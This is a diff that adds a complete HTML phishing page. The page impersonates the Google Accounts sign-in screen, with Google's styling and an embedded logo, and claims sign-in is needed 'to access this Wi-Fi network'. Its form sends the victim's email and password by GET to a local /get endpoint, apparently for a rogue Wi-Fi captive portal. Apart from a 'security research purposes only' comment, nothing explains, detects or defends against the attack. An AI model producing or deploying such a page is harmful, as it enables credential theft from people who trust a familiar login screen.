@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- For security research purposes only -->
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #202124;
+    }
+
+    .container {
+      background: #fff;
+      padding: 48px 40px 36px;
+      border-radius: 8px;
+      border: 1px solid #dadce0;
+      box-shadow: none;
+      width: 450px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .logo img {
+      width: 96px;
+      height: 32px;
+    }
+
+    .title {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 400;
+      margin: 16px 0 0;
+      padding: 0;
+    }
+
+    .subtext {
+      text-align: center;
+      margin: 8px 0 24px;
+      font-size: 16px;
+      font-weight: 400;
+      color: #5f6368;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+      width: 100%;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 13px 15px;
+      border-radius: 4px;
+      border: 1px solid #dadce0;
+      font-size: 16px;
+      height: 28px;
+      box-sizing: border-box;
+    }
+
+    .form-control:focus {
+      border: 1px solid #1a73e8;
+      outline: none;
+      box-shadow: inset 0 0 0 1px #1a73e8;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px 24px;
+      border: none;
+      border-radius: 4px;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      height: 36px;
+      min-width: 80px;
+      margin: 10px 0 20px;
+    }
+
+    button:hover {
+      background: #1b66c9;
+      box-shadow: 0 1px 3px 1px rgba(66,64,67,.15), 0 1px 2px 0 rgba(60,64,67,.3);
+    }
+
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .footer a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .language-selector {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      padding: 16px 0;
+      text-align: center;
+      background: #fff;
+      border-top: 1px solid #dadce0;
+      font-size: 13px;
+    }
+
+    .language-selector select {
+      border: none;
+      background: transparent;
+      color: #1a73e8;
+      font-size: 13px;
+      margin-left: 5px;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        width: 100%;
+        border: none;
+        padding: 24px;
+        height: 100vh;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="data:image/png;base64,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" alt="Google">
+    </div>
+    
+    <h1 class="title">Sign in</h1>
+    <p class="subtext">to access this Wi-Fi network.</p>
+
+    <form action="/get" method="GET">
+      <div class="form-group">
+        <input type="email" name="email" class="form-control" placeholder="Email or phone" required autofocus>
+      </div>
+
+      <div class="form-group">
+        <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
+      </div>
+
+      <button type="submit">Next</button>
+
+      <div class="footer">
+        <a href="#">Forgot email?</a>
+        <a href="#">Create account</a>
+      </div>
+    </form>
+  </div>
+
+  <div class="language-selector">
+    English (United States) <select><option>▼</option></select>
+  </div>
+
+</body>
+
+</html>
